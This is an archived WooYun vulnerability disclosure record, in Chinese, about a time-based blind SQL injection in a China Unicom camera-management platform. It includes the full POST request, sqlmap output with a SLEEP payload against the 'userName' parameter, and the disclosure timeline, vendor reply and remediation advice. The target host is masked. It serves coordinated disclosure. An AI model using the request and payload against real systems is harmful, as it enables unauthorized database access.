{"id": 69788, "wybug_id": "wooyun-2015-0136633", "wybug_title": "中国联通某平台SQL注入漏洞（修复不给力）", "wybug_corp": "中国联通", "wybug_author": "路人甲", "wybug_date": "2015-08-27 16:12", "wybug_open_date": "2015-10-14 07:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-30：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-09-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-14：\t细节向公众公开  简要描述： 咯，很久没来了 详细说明：  起因是这个洞<a href=\"http://**.**.**.**/bugs/wooyun-2015-0121611\">中国联通某摄像管理平台存在SQL注入漏洞</a>在欣赏玩洞主的作品后，我打开页面，发现注册的入口没了\n\n岂能难倒我，审查元素，发现了这个，当时我就默默笑了\n\n果然能访问，果然能注册，我就注册了个号进去试了试，之前的漏洞的确补了，我就找了个其他页面的\n**.**.**.**/user/manageUser.action\npost注入\nPOST /user/manageUser.action HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: **.**.**.**/user/manageUser.actionCookie: xxxxxxxxxxxxxConnection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 40userName=admin&deviceName=a&serialNo=ddd\n类型：time-based blind参数：userName,deviceName,serialNo都存在问题\nit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n][19:09:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'[19:09:39] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found[19:09:42] [INFO] checking if the injection point on POST parameter 'userName' is a false positivePOST parameter 'userName' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 104 HTTP(s) requests:---Parameter: userName (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: userName=admin' AND (SELECT * FROM (SELECT(SLEEP(5)))xMNd) AND 'qYeQ'='qYeQ&deviceName=a&serialNo=ddd---\n\nweb application technology: Apache 2.0.64back-end DBMS: MySQL 5.0.12\n\ncurrent user:    'root@localhost'\n时间盲注 太慢了 不跑了\n\n   漏洞证明：  如上，仅证明问题   修复方案：  1、去掉用户注册功能就在后台去掉，在前端注释算啥呢2、检查整站的sql语句拼接情况，排除SQL注入   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-08-30 07:15 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国联通集团公司通报,由其后续协调网站管理单位处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}